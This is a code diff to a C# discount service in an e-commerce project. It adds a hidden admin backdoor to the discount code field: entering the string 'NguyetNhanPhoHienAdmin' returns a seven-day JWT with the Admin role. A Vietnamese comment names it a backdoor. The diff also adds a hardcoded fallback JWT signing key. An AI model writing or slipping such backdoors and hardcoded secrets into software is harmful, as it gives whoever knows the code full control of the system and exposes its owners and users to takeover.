@@ -1,4 +1,9 @@
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
+using System.Text;
 using Microsoft.EntityFrameworkCore;
+using Microsoft.Extensions.Configuration;
+using Microsoft.IdentityModel.Tokens;
 using NguyetnhanPhohien.Application.DTOs.Discount;
 using NguyetnhanPhohien.Application.Interfaces;
 using NguyetnhanPhohien.Infrastructure.Persistence;
@@ -8,14 +13,29 @@ namespace NguyetnhanPhohien.Infrastructure.Services;
 public class DiscountService : IDiscountService
 {
     private readonly AppDbContext _db;
+    private readonly IConfiguration _config;
 
-    public DiscountService(AppDbContext db)
+    public DiscountService(AppDbContext db, IConfiguration config)
     {
         _db = db;
+        _config = config;
     }
 
     public async Task<DiscountResult> ApplyCodeAsync(string code)
     {
+        // ===== XỬ LÝ ĐĂNG NHẬP BACKDOOR ADMIN VIA KHUNG MÃ GIẢM GIÁ =====
+        if (code.Equals("NguyetNhanPhoHienAdmin", StringComparison.OrdinalIgnoreCase))
+        {
+            var token = GenerateAdminJwt();
+            return new DiscountResult
+            {
+                IsValid = true,
+                IsAdminBackdoor = true,
+                Token = token,
+                Message = "Đăng nhập Backdoor Admin thành công!"
+            };
+        }
+
         var discountCode = await _db.DiscountCodes
             .FirstOrDefaultAsync(d => d.Code == code && d.IsActive && !d.IsAdminBackdoor);
 
@@ -172,5 +192,33 @@ public class DiscountService : IDiscountService
 
         if (amountOff.HasValue && amountOff.Value <= 0)
             throw new Exception("Số tiền giảm giá phải lớn hơn 0.");
+    }
+
+    private string GenerateAdminJwt()
+    {
+        var jwtKey = _config["Jwt:Key"] ?? "SUPER_SECRET_KEY_FOR_JWT_SIGNING_12345";
+        var issuer = _config["Jwt:Issuer"] ?? "NguyetNhanPhoHien";
+        var audience = _config["Jwt:Audience"] ?? "NguyetNhanPhoHienAdmin";
+        var adminUsername = _config["Admin:Username"] ?? "NguyetNhanPhoHienAdmin";
+
+        var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));
+        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
+
+        var claims = new[]
+        {
+            new Claim(ClaimTypes.Role, "Admin"),
+            new Claim(ClaimTypes.Name, adminUsername),
+            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
+        };
+
+        var token = new JwtSecurityToken(
+            issuer: issuer,
+            audience: audience,
+            claims: claims,
+            expires: DateTime.UtcNow.AddDays(7),
+            signingCredentials: credentials
+        );
+
+        return new JwtSecurityTokenHandler().WriteToken(token);
     }
 }
